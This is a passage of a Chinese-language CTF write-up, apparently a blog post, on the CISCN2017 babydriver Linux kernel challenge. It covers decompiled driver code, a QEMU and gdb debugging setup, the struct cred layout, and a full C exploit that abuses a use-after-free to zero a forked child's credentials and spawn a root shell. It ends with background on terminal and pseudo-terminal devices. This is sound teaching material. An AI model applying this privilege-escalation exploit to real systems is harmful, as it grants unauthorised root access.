class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h4><p>babyioctl 函数的功能类似于 <code>realloc</code>：将原先的 device_buf 释放，并分配一块新的内存。</p>
<p>但这里有个很重要的点需要注意：<strong>该位置的 kmalloc 大小可以被用户任意指定</strong>，而不是先前 babyopen 中的 64。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">babyioctl</span><span class="params">(file *filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> __int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(v4, <span class="number">37748928LL</span>);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="获取到的信息"><a href="#获取到的信息" class="headerlink" title="获取到的信息"></a>获取到的信息</h3><p>根据上面的分析，最终我们可以得到以下信息：</p>
<p>已开启的保护：</p>
<ul>
<li>nx</li>
<li>smep</li>
</ul>
<p>内核模块中可能能利用的点：</p>
<ul>
<li>babyrelease <strong>释放 device_buf 指针后没有置空，device_buf_len 没有重置为0</strong></li>
<li>babyioctl 可以让 device_buf 重新分配<strong>任意大小</strong>的内存</li>
<li>当前内核模块中<strong>所有用到的变量都是全局变量</strong>，这意味着<strong>并发性非常的脆弱</strong>，或许可以利用一下。</li>
</ul>
<h2 id="调试前的准备"><a href="#调试前的准备" class="headerlink" title="调试前的准备"></a>调试前的准备</h2><ul>
<li>编写以下 shell 脚本以快速启动调试会话</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">静态编译 exp</span></span><br><span class="line">gcc exp.c -static -o rootfs/exp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rootfs 打包</span></span><br><span class="line">pushd rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br><span class="line">popd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 qemu</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -initrd rootfs.cpio \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 &#x27; \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -m 64M \</span><br><span class="line">    --nographic  \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>下面是调试脚本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gnome-terminal -e &#x27;sudo gdb -x ./mygdbinit&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>下面是mygdbinit文件</li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file ./2vmlinux</span><br><span class="line"></span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line"></span><br><span class="line">add-symbol-file       babydriver.ko      0xffffffffc0000000</span><br><span class="line">b babyread</span><br><span class="line">b babywrite</span><br><span class="line">b babyioctl</span><br><span class="line">b babyopen</span><br><span class="line">b babyrelease </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>获取 vmlinux</p>
<p>我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 工具，从 bzImage 中解压出 vmlinux。</p>
<blockquote>
<p>直接让 gdb 加载 bzImage 时将无法加载到任何 kernel 符号，</p>
<p>因此需要先从 bzImage 中解压出 vmlinux， 再来让 gdb 加载符号。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux</span><br><span class="line">chmod +x ./extract-vmlinux</span><br><span class="line">cd CISCN2017-babydriver/babydriver/</span><br><span class="line">../../extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>

<p>但实际上，解压出来的 vmlinux 的函数名称全部为 <code>sub_xxxx</code>，不方便调试。即便所有的内核符号与函数名称的信息全部位于内核符号表中（或者 <code>/proc/kallsyms</code>），但一个个对应过去也相当麻烦。</p>
<p>因此还有一个工具可以使用：<code>vmlinux-to-elf</code></p>
<blockquote>
<p>使用这个工具之前系统中必须装有<strong>高于3.5</strong>版本的python</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">sudo</span> apt install python3-pip</span></span><br><span class="line">sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>

<p>使用方式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">vmlinux-to-elf &lt;input_kernel.bin&gt; &lt;output_kernel.elf&gt;</span></span><br><span class="line">vmlinux-to-elf bzImage vmlinux</span><br></pre></td></tr></table></figure>

<p>之后解压出来的 vmlinux 就是带符号的，可以正常被 gdb 读取和下断点。</p>
</li>
<li><p>查看当前 bzImage 所对应的内核版本，并下载该版本的内核代码（如果有需要，想更细致的研究内核的话）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">strings bzImage | grep <span class="string">&quot;gcc&quot;</span> <span class="comment"># 或者 `file bzImage` 命令</span></span></span><br><span class="line">4.4.72 (atum@ubuntu) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #1 SMP Thu Jun 15 19:52:50 PDT 2017</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-4.4.72.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">unxz linux-4.4.72.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -xf linux-4.4.72.tar</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>启动 kernel 后，别忘记在 gdb 中使用 <code>add-symbol-file</code> 加载 ko 的符号：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">in</span> kernel shell:</span></span><br><span class="line">/ $ lsmod</span><br><span class="line">babydriver 16384 0 - Live 0xffffffffc0000000 (OE)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">in</span> gdb:</span></span><br><span class="line">gef➤  add-symbol-file babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="kernel-的-UAF-利用"><a href="#kernel-的-UAF-利用" class="headerlink" title="kernel 的 UAF 利用"></a>kernel 的 UAF 利用</h2><h3 id="覆写-cred-结构体"><a href="#覆写-cred-结构体" class="headerlink" title="覆写 cred 结构体"></a>覆写 cred 结构体</h3><p>UAF 的常规利用是通过悬垂指针来修改某块特定内存上的数据，因此在这里我们可以试着：</p>
<ul>
<li>先让一个悬垂指针指向一块已被释放的内存</li>
<li>执行 fork 操作，使 fork 时给新子进程分配的 <code>struct cred</code> 结构体重新分配这块内存</li>
<li>利用悬垂指针来随意修改这块内存上的 <code>struct cred</code> 结构体，达到提权的效果</li>
</ul>
<p><code>struct cred</code> 结构体用于 <strong>保存每个进程的权限</strong>，其结构如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *  task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *  upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">  <span class="type">atomic_t</span>  usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">  <span class="type">atomic_t</span>  subscribers;  <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">  <span class="type">void</span>    *put_addr;</span><br><span class="line">  <span class="type">unsigned</span>  magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD  0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">kuid_t</span>    uid;    <span class="comment">/* real UID of the task */</span></span><br><span class="line">  <span class="type">kgid_t</span>    gid;    <span class="comment">/* real GID of the task */</span></span><br><span class="line">  <span class="type">kuid_t</span>    suid;    <span class="comment">/* saved UID of the task */</span></span><br><span class="line">  <span class="type">kgid_t</span>    sgid;    <span class="comment">/* saved GID of the task */</span></span><br><span class="line">  <span class="type">kuid_t</span>    euid;    <span class="comment">/* effective UID of the task */</span></span><br><span class="line">  <span class="type">kgid_t</span>    egid;    <span class="comment">/* effective GID of the task */</span></span><br><span class="line">  <span class="type">kuid_t</span>    fsuid;    <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">  <span class="type">kgid_t</span>    fsgid;    <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  <span class="type">unsigned</span>  securebits;  <span class="comment">/* SUID-less security management */</span></span><br><span class="line">  <span class="type">kernel_cap_t</span>  cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">  <span class="type">kernel_cap_t</span>  cap_permitted;  <span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">  <span class="type">kernel_cap_t</span>  cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">  <span class="type">kernel_cap_t</span>  cap_bset;  <span class="comment">/* capability bounding set */</span></span><br><span class="line">  <span class="type">kernel_cap_t</span>  cap_ambient;  <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>  jit_keyring;  <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">           * keys to */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">  <span class="type">void</span>    *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>  <span class="comment">/* real user ID subscription */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>  <span class="title">rcu</span>;</span>    <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>新进程的 <code>struct cred</code> 结构体分配的代码位于 <code>_do_fork -&gt; copy_process -&gt; copy_creds -&gt; prepare_creds</code> 函数调用链中。</p>
<p>为了避开繁琐的内存分配利用，精简利用方式，我们只需要让 babydriver 中释放的 <code>device_buf</code> 内存的大小与 <code>sizeof(struct cred)</code>一致即可，这样便可以让内核在为 struct cred 分配内存时，分配到刚释放不久的 device_buf 内存。</p>
<p>由于当前 bzImage 解压出来的 vmlinux 没有<strong>结构体</strong>符号，因此我们可以直接根据默认参数编译出一个新的 vmlinux，并加载该 vmlinux 来获取 <code>struct cred</code> 结构体的大小：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p <span class="title function_">sizeof</span><span class="params">(<span class="keyword">struct</span> cred)</span></span><br><span class="line">$1 = <span class="number">0xa8</span></span><br></pre></td></tr></table></figure>

<p>执行完 <code>babyrelease</code> 函数之后，<code>device_buf</code>就会成为悬垂指针。但需要注意的是，在用户进程空间中，当执行<code>close(fd)</code>之后，该进程将无法再使用这个文件描述符，因此没有办法在<code>close</code>后再利用这个 fd 去进行写操作。</p>
<p>但我们可以利用 babydriver 中的<strong>变量全是全局变量</strong>的这个特性，同时执行两次 open 操作，获取两个 fd。这样即便一个 fd 被 close 了，我们仍然可以利用另一个 fd 来对 <code>device_buf</code> 进行写操作。</p>
<p>这样一套完整的利用流程就出来了，exploit 如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR); <span class="comment">// alloc</span></span><br><span class="line">    ioctl(fd1, <span class="number">65537</span>, <span class="number">0xa8</span>);    <span class="comment">// realloc</span></span><br><span class="line">    close(fd1); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        <span class="comment">// child</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// try to overwrite struct cred</span></span><br><span class="line">        <span class="type">char</span> mem[<span class="number">4</span> * <span class="number">7</span>]; <span class="comment">// usage uid gid suid sgid euid egid</span></span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="string">&#x27;\x00&#x27;</span>, <span class="keyword">sizeof</span>(mem));</span><br><span class="line">        write(fd2, mem, <span class="keyword">sizeof</span>(mem));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get shell</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] after LPE, privilege: %s\n&quot;</span>, (getuid() ? <span class="string">&quot;user&quot;</span> : <span class="string">&quot;root&quot;</span>));</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// parent</span></span><br><span class="line">        waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要注意的是，当进程执行完 fork 操作后，父进程必须 wait 子进程，否则当父进程被销毁后，该进程成为孤儿进程，将无法使用终端进行输入输出。</p>
</blockquote>
<p>利用结果：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20240419221640091](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20240419221640091.png)</a></p>
<h3 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h3><h3 id="1-终端设备类型简介"><a href="#1-终端设备类型简介" class="headerlink" title="1) 终端设备类型简介"></a>1) 终端设备类型简介</h3><p>在 Linux 中 <code>/dev</code> 目录下，终端设备文件通常有以下几种：</p>
<blockquote>
<p>注意：以下这些类型的终端不一定在所有发行版 linux 上都存在，例如 <code>/dev/ttyprintk</code> 就不存在于我的 kali linux 上。</p>
</blockquote>
<ol>
<li><p>串行端口终端 （**&#x2F;dev&#x2F;ttySn**） ：是用于与串行端口连接的终端设备，类似于 Windows 下的 COM。</p>
</li>
<li><p>控制终端 （**&#x2F;dev&#x2F;tty<strong>） ：</strong>当前进程**的控制终端设备文件，类似于符号链接，会具体对应至某个实际终端文件。</p>
<blockquote>
<p>可以使用 <code>tty</code> 命令查看其具体对应的终端设备，也可以使用 <code>ps -ax</code> 来查看进程与控制终端的映射关系。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211007225628587](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211007225628587.png)</a></p>
<blockquote>
<p>在 qemu 下，可以通过指定<code>-append &#39;console=ttyS0&#39;</code> 参数，设置 linux kernel tty 映射至 <code>/dev/ttySn</code> 上。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211007230821016](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211007230821016.png)</a></p>
</li>
<li><p>虚拟终端与控制台 （**&#x2F;dev&#x2F;ttyN, &#x2F;dev&#x2F;console<strong>） ：在Linux 系统中，计算机显示器通常被称为</strong>控制台终端** (Console)。而在 linux <strong>初始字符界面</strong>下，为了同时处理多任务，自然需要多个终端的切换。这些终端由于是用软件来模拟以前硬件的方式，是虚拟出来的，因此也称为<strong>虚拟终端</strong>。</p>
<blockquote>
<p>虚拟终端和控制台的差别需要参考历史。在以前，终端是通过串口连接上的，不是计算机本身就有的设备，而控制台是计算机本身就有的设备，一个计算机只有一个控制台。</p>
<p>简单的说，<strong>控制台是直接和计算机相连接的原生设备，终端是通过电缆、网络等等和主机连接的设备</strong></p>
<p>计算机启动的时候，所有的信息都会显示到控制台上，而不会显示到终端上。也就是说，控制台是计算机的基本设备，而终端是附加设备。</p>
<p>由于控制台也有终端一样的功能，控制台有时候也被模糊的统称为终端。</p>
<p>计算机操作系统中，与终端不相关的信息，比如内核消息，后台服务消息，都可以显示到控制台上，但不会显示到终端上。</p>
<p>由于时代的发展，硬件资源的丰富，终端和控制台的概念已经慢慢淡化。</p>
</blockquote>
<p>这种虚拟终端的切换与我们X11中图形界面中多个终端的切换不同，它属于<strong>更高级别终端的切换</strong>。我们日常所使用的图形界面下的终端，属于某个<strong>虚拟图形终端界面</strong>下的多个<strong>伪终端</strong>。</p>
<p>可以通过键入 <code>Ctrl+Alt+F1</code> （其中的 F<strong>x</strong> 表示切换至第 <strong>x</strong> 个终端，例如 F1）来切换虚拟终端。</p>
<blockquote>
<p>tty0则是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上。</p>
</blockquote>
<p>默认情况下，F1-F6均为字符终端界面，F7-F12为图形终端界面。</p>
<blockquote>
<p>当切换至字符终端界面后，可再次键入 <code>Ctrl+Alt+F7</code>切回图形终端界面。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211007231737902](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211007231737902.png)</a></p>
</li>
<li><p>伪终端 （**&#x2F;dev&#x2F;pty<strong>）：</strong>伪终端(Pseudo Terminal)**是成对的**逻辑**终端设备，其行为与普通终端非常相似。所不同的是伪终端没有对应的硬件设备，主要目的是实现双向信道，为其他程序提供终端形式的接口。</p>
<p>当我们远程连接到主机时，与主机进行交互的终端的类型就是伪终端，而且日常使用的图形界面中的多个终端也全都是伪终端。</p>
<p>伪终端的两个终端设备分别称为 master 设备和 slave 设备，其中 slave 设备的行为与普通终端无异。</p>
<p>当某个程序把某个 master 设备看作终端设备并进行读写，则该读写操作将实际反应至该逻辑终端设备所对应的另一个 slave 设备。通常 slave 设备也会被其他程序用于读写。因此这两个程序便可以通过这对逻辑终端来进行通信。</p>
<p>现代 linux 主要使用 <strong>UNIX 98 pseudoterminals</strong> 标准，即 <strong>pts(pseudo-terminal slave, &#x2F;dev&#x2F;pts&#x2F;n)</strong> 和 <strong>ptmx(pseudo-terminal master, &#x2F;dev&#x2F;ptmx)</strong> 搭配来实现 pty。</p>
<p>伪终端的使用一会将在下面详细说明。</p>
</li>
<li><p>其他终端 （诸如 <strong>&#x2F;dev&#x2F;ttyprintk</strong> 等等）。这类终端通常是用于特殊的目的，例如 <strong>&#x2F;dev&#x2F;ttyprintk</strong> 直接与内核缓冲区相连：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211007233344098](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211007233344098.png)</a></p>
</li>
</ol>
<h3 id="2-伪终端的使用"><a href="#2-伪终端的使用" class="headerlink" title="2) 伪终端的使用"></a>2) 伪终端的使用</h3><p>伪终端的具体实现分为两种</p>
<ul>
<li>UNIX 98 pseudoterminals，涉及 <code>/dev/ptmx</code> （master）和 <code>/dev/pts/*</code>（slave）</li>
<li>老式 BSD pseudoterminals，涉及 <code>/dev/pty[p-za-e][0-9a-f]</code>(master) 和 <code>/dev/tty[p-za-e][0-9a-f]</code>(slave)</li>
</ul>
<p>这里我们只介绍 UNIX 98 pseudoterminals。</p>
